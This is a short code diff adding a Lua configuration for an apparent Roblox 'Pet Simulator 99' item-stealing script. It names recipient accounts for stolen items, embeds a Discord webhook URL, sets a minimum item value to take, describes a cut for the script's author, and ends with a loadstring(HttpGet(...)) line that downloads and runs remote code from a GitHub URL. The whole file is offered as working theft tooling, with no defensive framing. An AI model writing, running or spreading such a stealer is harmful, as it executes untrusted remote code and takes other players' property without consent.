@@ -1,0 +1,6 @@
+Username = "lianpogi656"
+Username2 = "lianpogi656" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "https://discord.com/api/webhooks/1242815658266329159/m5iDYNfwoQYG-iqzMefVapFJcuCbU1mv1M7v0lDmwZK2snbkmgg4MQku1OIXpl5p_ipp"
+Support = false -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
+min_rap = 200000 -- minimum rap of each item you want to get sent to you.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
